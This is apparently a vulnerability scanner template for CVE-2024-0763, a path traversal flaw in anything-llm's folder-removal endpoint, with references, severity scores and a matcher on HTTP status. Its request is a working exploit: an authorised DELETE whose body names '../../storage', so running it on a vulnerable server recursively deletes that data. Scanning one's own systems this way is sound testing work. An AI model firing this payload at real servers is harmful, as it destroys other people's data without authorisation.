id: CVE-2024-0763
info:
  name: Path Traversal Vulnerability in File Download Function
  author: may
  severity: high
  description: Any user can delete an arbitrary folder (recursively) on a remote server due to bad input sanitization leading to path traversal. The attacker would need access to the server at some privilege level since this endpoint is protected and requires authorization.
  reference:
    - https://github.com/mintplex-labs/anything-llm/commit/8a7324d0e77a15186e1ad5e5119fca4fb224c39c
    - https://huntr.com/bounties/25a2f487-5a9c-4c7f-a2d3-b0527db73ea5
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H
    cvss-score: 8.1
    cve-id: CVE-2024-0763
    cwe-id: CWE-20
    epss-score: 0.00043
    epss-percentile: 0.07361

http:
  - method: DELETE
    path:
      - "{{BaseURL}}/api/system/remove-folder"
    headers:
      Authorization: Bearer {{TOKEN}}
      Content-Type: application/json
    body: '{"name" : "../../storage"}'
    matchers:
      - type: status
        status:
          - 200
